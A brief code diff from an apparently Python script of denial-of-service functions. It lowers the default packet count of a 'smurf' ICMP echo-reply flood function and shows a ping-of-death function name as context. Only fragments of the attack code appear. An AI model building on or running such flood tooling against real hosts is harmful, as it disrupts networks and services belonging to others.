@@ -62,7 +62,7 @@ def pod(target_ip, src_ip="192.168.147.152"):
 
 
 # Denial of service icmp echo reply flood
-def smurf(source_ip, target_ip, packets_send=10000):
+def smurf(source_ip, target_ip, packets_send=1000):
     print("Executing smurf at: " + str(datetime.now()))
     count = 0
     while count < packets_send:
